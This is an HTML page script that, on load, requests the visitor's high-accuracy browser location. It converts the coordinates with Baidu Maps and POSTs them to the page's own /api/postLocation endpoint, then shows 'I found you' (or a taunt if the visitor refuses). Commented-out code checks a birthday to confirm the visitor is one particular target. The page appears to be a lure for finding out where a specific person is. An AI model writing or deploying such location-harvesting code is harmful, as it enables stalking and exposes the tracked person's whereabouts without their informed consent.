  <script>
    // const birthday = prompt("请输入你的生日 YYYY-MM-DD:");
    // if (birthday != null){
    //     validate({birthday});
    // }
    init();
    // $("#text").html('我找到你了');
    function init() {
      try {
        let result;
        navigator.geolocation.getCurrentPosition(
          v => {
            const {
              coords: {
                longitude,
                latitude
              }
            } = v;
            result = {
                longitude,
                latitude
            };
            const ggPoint = new BMap.Point(longitude,latitude);
            const convertor = new BMap.Convertor();
            const pointArr = [ggPoint];
            const translateCallback = function (data){
              if(data.status === 0) {
                const {points} = data;
                const {lat, lng} = points[0] || [];
                set({longitude: lng, latitude: lat});
              }
            }
            convertor.translate(pointArr, 1, 5, translateCallback)
            $("#text").html('我找到你了');
        }, error => {
            $("#text").html('哼，不愧是你');
            set({longitude: 0, latitude: 0})
        }, {
          enableHighAccuracy: true
        });
      }
      catch (e) {}
    }
    function set(params) {
      $.ajax("/api/postLocation", {
        method: "POST",
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        data: JSON.stringify({
          ...params,
        }),
      })
    }
    function validate(params) {
      $.ajax("/api/validate", {
        method: "POST",
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        data: JSON.stringify({
          ...params,
        }),
      }).done(function (res) {
        const {code} = res;
        console.log(code);
        if (!code) {
          init();
        }
        else {
          alert('抱歉哦，你不是我要找的人');
        }
      });
    }
  </script>
